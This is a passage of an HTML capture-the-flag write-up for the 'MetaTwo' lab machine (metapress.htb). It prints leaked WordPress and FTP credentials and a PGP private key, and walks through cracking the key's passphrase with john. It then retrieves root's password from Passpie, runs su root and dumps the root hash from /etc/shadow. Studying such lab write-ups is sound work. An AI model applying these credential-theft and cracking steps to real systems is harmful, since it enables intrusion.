Q2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==" | base64 -d
+&lt;?php
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'blog' );
+
+/** MySQL database username */
+define( 'DB_USER', 'blog' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+define( 'FS_METHOD', 'ftpext' );
+<span class="k">define( 'FTP_USER', 'metapress.htb' );
+define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );</span>
+define( 'FTP_HOST', 'ftp.metapress.htb' );
+define( 'FTP_BASE', 'blog/' );
+define( 'FTP_SSL', false );
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
+define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
+define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
+define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
+define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
+define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
+define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
+define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );
+
+/**
+ * WordPress Database Table prefix.
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+        define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+</span>
+</code></pre></div></div>
+
+<p>We can use these credentials to log into the FTP server:</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> ftp </span>metapress.htb
+Connected to metapress.htb.
+220 ProFTPD Server (Debian) [::ffff:10.129.66.181]
+Name (metapress.htb:kali): metapress.htb
+331 Password required for metapress.htb
+Password: 
+230 User metapress.htb logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> cd mailer
+250 CWD command successful
+ftp> dir
+229 Entering Extended Passive Mode (|||63774|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
+-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22 18:32 send_email.php
+226 Transfer complete
+ftp> get send_email.php
+local: send_email.php remote: send_email.php
+229 Entering Extended Passive Mode (|||45048|)
+150 Opening BINARY mode data connection for send_email.php (1126 bytes)
+100% |**********************************************************|  1126        2.39 MiB/s    00:00 ETA
+ftp> exit
+</span>
+</code></pre></div></div>
+
+<p>The file we downloaded contains the ssh credentials for the <span style="color:rgb(255, 0, 234);">jnelson</span> user.</p>
+
+<p>Using <span style="color:rgb(255, 0, 234);">ls -la</span> we see a file called <span style="color:rgb(255, 0, 234);">root.pass</span> in the <span style="color:rgb(255, 0, 234);">/.passpie/ssh</span> folder:</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">jnelson@meta2$</span><span class="ld"><span class="kt"> cat </span>.passpie/.keys | tail -n45
+-----BEGIN PGP PRIVATE KEY BLOCK-----
+
+lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
+AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
+/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho
+3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT
+ZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV
+gNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX
+5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEp
+tQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb
+a1UfdG+soO3jtQsBAKbYl2yF/+D81v+42827iqO6gqoxHbc/0epLqJ+Lbl8hC/sG
+WIVdy+jynHb81B3FIHT832OVi2hTCT6vhfTILFklLMxvirM6AaEPFhxIuRboiEQw
+8lQMVtA1l+Et9FXS1u91h5ZL5PoCfhqpjbFD/VcC5I2MhwL7n50ozVxkW2wGAPfh
+cODmYrGiXf8dle3z9wg9ltx25XLsVjoR+VLm5Vji85konRVuZ7TKnL5oXVgdaTML
+qIGqKLQfhHwTdvtYOTtcxW3tIdI16YhezeoUioBWY1QM5z84F92UVz6aRzSDbc/j
+FJOmNTe7+ShRRAAPu2qQn1xXexGXY2BFqAuhzFpO/dSidv7/UH2+x33XIUX1bPXH
+FqSg+11VAfq3bgyBC1bXlsOyS2J6xRp31q8wJzUSlidodtNZL6APqwrYNhfcBEuE
+PnItMPJS2j0DG2V8IAgFnsOgelh9ILU/OfCA4pD4f8QsB3eeUbUt90gmUa8wG7uM
+FKZv0I+r9CBwjTK3bg/rFOo+DJKkN3hAfkARgU77ptuTJEYsfmho84ZaR3KSpX4L
+/244aRzuaTW75hrZCJ4RxWxh8vGw0+/kPVDyrDc0XNv6iLIMt6zJGddVfRsFmE3Y
+q2wOX/RzICWMbdreuQPuF0CkcvvHMeZX99Z3pEzUeuPu42E6JUj9DTYO8QJRDFr+
+F2mStGpiqEOOvVmjHxHAduJpIgpcF8z18AosOswa8ryKg3CS2xQGkK84UliwuPUh
+S8wCQQxveke5/IjbgE6GQOlzhpMUwzih7+15hEJVFdNZnbEC9K/ATYC/kbJSrbQM
+RfcJUrnjPpDFgF6sXQJuNuPdowc36zjE7oIiD69ixGR5UjhvVy6yFlESuFzrwyeu
+TDl0UOR6wikHa7tF/pekX317ZcRbWGOVr3BXYiFPTuXYBiX4+VG1fM5j3DCIho20
+oFbEfVwnsTP6xxG2sJw48Fd+mKSMtYLDH004SoiSeQ8kTxNJeLxMiU8yaNX8Mwn4
+V9fOIdsfks7Bv8uJP/lnKcteZjqgBnXPN6ESGjG1cbVfDsmVacVYL6bD4zn6ZN/n
+WP4HAwKQfLVcyzeqrf8h02o0Q7OLrTXfDw4sd/a56XWRGGeGJgkRXzAqPQGWrsDC
+6/eahMAwMFbfkhyWXlifgtfdcQme2XSUCNWtF6RCEAbYm0nAtDNQYXNzcGllIChB
+dXRvLWdlbmVyYXRlZCBieSBQYXNzcGllKSA8cGFzc3BpZUBsb2NhbD6IkAQTEQgA
+OBYhBHxnhqdWG8hPUEhnHjh3dcNXRdIDBQJiuFfWAhsjBQsJCAcCBhUKCQgLAgQW
+AgMBAh4BAheAAAoJEDh3dcNXRdIDRFQA/3V6S3ad2W9c1fq62+X7TcuCaKWkDk4e
+qalFZ3bhSFVIAP4qI7yXjBXZU4+Rd+gZKp77UNFdqcCyhGl1GpAJyyERDZ0BXwRi
+uFfWEAQAhBp/xWPRH6n+PLXwJf0OL8mXGC6bh2gUeRO2mpFkFK4zXE5SE0znwn9J
+CBcYy2EePd5ueDYC9iN3H7BYlhAUaRvlU7732CY6Tbw1jbmGFLyIxS7jHJwd3dXT
++PyrTxF+odQ6aSEhT4JZrCk5Ef7/7aGMH4UcXuiWrgTPFiDovicAAwUD/i6Q+sq+
+FZplPakkaWO7hBC8NdCWsBKIQcPqZoyoEY7m0mpuSn4Mm0wX1SgNrncUFEUR6pyV
+jqRBTGfPPjwLlaw5zfV+r7q+P/jTD09usYYFglqJj/Oi47UVT13ThYKyxKL0nn8G
+JiJHAWqExFeq8eD22pTIoueyrybCfRJxzlJV/gcDAsPttfCSRgia/1PrBxACO3+4
+VxHfI4p2KFuza9hwok3jrRS7D9CM51fK/XJkMehVoVyvetNXwXUotoEYeqoDZVEB
+J2h0nXerWPkNKRrrfYh4BBgRCAAgFiEEfGeGp1YbyE9QSGceOHd1w1dF0gMFAmK4
+V9YCGwwACgkQOHd1w1dF0gOm5gD9GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+P
+o3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN
+=7Uo6
+-----END PGP PRIVATE KEY BLOCK-----
+</span>
+</code></pre></div></div>
+
+<p>We can use <span style="color:rgb(255, 0, 234);">john</span> to crack this hash:</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">$</span><span class="ld"><span class="kt"> gpg2john </span>pgpkey > pgphash</span>
+<span class="na">$</span><span class="ld"><span class="kt"> john </span>--wordlist=rockyou.txt pgphash
+
+1 ⨯
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65011712 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="k">blink182</span>         (Passpie)     
+1g 0:00:00:01 DONE (2022-10-30 03:19) 0.6849g/s 115.0p/s 115.0c/s 115.0C/s peanut..987654
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+</span>
+</code></pre></div></div>
+
+<p>Now we can use this to get root's password from the passpie program:</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>
+<span class="na">jnelson@meta2:~/.passpie/ssh$</span><span class="ld"><span class="kt"> passpie </span>copy ssh --to stdout
+
+Passphrase: <span class="k">blink182</span>
+p7qfAZt4_A1xo_0x
+</span>
+<span class="na">jnelson@meta2:~/.passpie/ssh$</span><span class="ld"><span class="kt"> su </span>root
+
+Password: <span class="k">p7qfAZt4_A1xo_0x</span>
+root@meta2:/home/jnelson/.passpie/ssh# cat /etc/shadow | grep root
+
+root:<span class="k">$y$j9T$dnzdMw6.gAkYBbVw1pRaz.$2laiSFO34jFWk9/r6kkJo2tArgYO8AGv2v0FkUPwlr2:19270:0:99999:7:::</span>
+</span>
+</code></pre></div></div>
+
+<p>Cool Box!</p>
+
+</main>
+</body>
+</div>
+
+</html>
